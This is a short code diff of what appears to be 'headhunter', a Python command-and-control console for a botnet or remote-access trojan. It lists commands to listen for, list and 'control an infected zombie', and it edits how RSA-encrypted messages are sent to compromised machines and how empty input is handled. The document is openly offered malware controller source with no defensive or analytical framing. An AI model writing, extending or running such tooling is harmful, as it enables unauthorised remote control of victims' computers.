@@ -55,9 +55,8 @@ while True:
 help                      --          displays this menu
 listen <LHOST> <LPORT>    --	      starts listening for zombies on the specified local address and port
 show connections	  -- 	      displays active zombie connections by address and source port
-exit                      --          exits the headhunter interactive shell
 control <session>         --          controls an infected zombie by session number
-
+exit                      --          exits the headhunter interactive shell
 		''')
 
 	elif cmd == "control":
@@ -65,9 +64,9 @@ control <session>         --          controls an infected zombie by session num
 		try:
 			zombie = server.c[int(subcmd)-1]
 			zombiepubkey = server.public_partner[int(subcmd)-1]
-			hello = "\n"
-			zombie.send(rsa.encrypt(hello.encode(), zombiepubkey))
-			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()))
+			zombie.send(rsa.encrypt(str.encode("\n"), zombiepubkey))
+			#zombie.recv(1024)
+			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()) + "\n")
 			server.control(zombie, zombiepubkey)	
 		except OSError:
 			print("Zombie is currently disconnected on selected session")
@@ -90,6 +89,9 @@ control <session>         --          controls an infected zombie by session num
 
 	elif cmd == "exit":
 		exit()
+
+	elif cmd.strip(" ") == "":
+		continue	
 
 	else:
 		print("Invalid command, type \"help\" for a list of commands\n")
